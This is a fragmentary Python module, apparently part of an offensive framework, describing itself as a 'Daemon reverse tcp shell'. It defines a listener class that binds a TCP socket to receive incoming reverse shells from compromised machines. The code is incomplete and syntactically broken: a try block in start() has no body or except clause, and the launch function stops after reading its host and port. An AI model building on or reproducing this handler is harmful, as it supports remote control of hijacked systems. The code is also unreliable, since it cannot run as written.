
#basic module description
def description():
    return "Daemon reverse tcp shell"

#basic module rank
def rank():
    return "Excellent"

#basic module date
def date():
    return "23.07.2026"

#set arguments
def depargs():
    return {
        "host": "IPv4 addr",
        "port": "Port"
    }

#imports
from StrFuncs import err, evnt, datetime
import socket
import sys
import threading
clientsocket = None
clientaddr = None
lock = threading.Lock()

#main function
class listener:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.clientsocket = None
        self.clientaddr = None

    def start(self):
        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.serversocket.bind((self.host, self.port))
            self.serversocket.listen(1)
            



#launch func
def launch(args: dict) -> None:
    ip = args.get("host", "127.0.0.1")
    port = int(args.get("port", 8888))
